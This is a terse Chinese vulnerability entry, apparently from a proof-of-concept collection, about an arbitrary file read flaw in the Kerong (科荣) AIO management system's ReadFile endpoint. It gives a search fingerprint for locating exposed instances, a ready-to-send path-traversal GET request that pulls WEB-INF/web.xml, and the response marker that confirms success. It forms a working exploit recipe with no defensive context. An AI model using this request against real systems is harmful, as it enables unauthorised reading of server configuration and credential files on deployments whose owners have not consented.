# 科荣AIO管理系统ReadFile任意文件读取漏洞

科荣AIO管理系统ReadFile ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="changeAccount('8000')"`
- **请求**：`GET /ReadFile?tempFile=path&path=../../website/WEB-INF/&fileName=web.xml HTTP/1.1`
- **响应特征**：200 web-app